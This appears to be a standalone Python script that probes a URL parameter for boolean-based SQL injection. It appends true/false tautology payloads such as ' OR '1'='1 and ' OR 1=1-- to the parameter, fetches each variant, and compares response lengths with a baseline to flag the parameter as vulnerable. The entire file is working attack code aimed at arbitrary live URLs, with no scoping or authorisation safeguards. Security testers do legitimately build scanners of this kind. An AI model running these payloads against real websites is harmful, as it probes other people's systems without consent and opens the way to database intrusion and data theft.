import urllib.parse
import urllib.request

PAYLOADS_TRUE = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1-- ",
    '" OR 1=1-- '
]

PAYLOADS_FALSE = [
    "' OR '1'='2",
    '" OR "1"="2',
    "' OR 1=2-- ",
    '" OR 1=2-- '
]

def fetch(url: str) -> str:
    """Fetch a URL and return the body as text."""
    with urllib.request.urlopen(url) as resp:
        return resp.read().decode('utf-8', errors='replace')


def test_parameter(url: str, param: str, value: str):
    """Attempt boolean-based SQL injection on a parameter."""
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    original = query.get(param, [''])[0]

    try:
        baseline_body = fetch(url)
    except Exception as e:
        baseline_body = str(e)
    baseline_len = len(baseline_body)

    results = []
    for p_true, p_false in zip(PAYLOADS_TRUE, PAYLOADS_FALSE):
        query[param] = original + p_true
        new_query = urllib.parse.urlencode(query, doseq=True)
        true_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        try:
            body_true = fetch(true_url)
        except Exception as e:
            body_true = str(e)

        query[param] = original + p_false
        new_query = urllib.parse.urlencode(query, doseq=True)
        false_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        try:
            body_false = fetch(false_url)
        except Exception as e:
            body_false = str(e)

        len_true = len(body_true)
        len_false = len(body_false)
        vulnerable = (
            len_true != len_false and (
                len_true == baseline_len or len_false == baseline_len
            )
        )
        results.append({
            'url': true_url,
            'param': param,
            'payload': p_true,
            'vulnerable': vulnerable,
        })
    return results
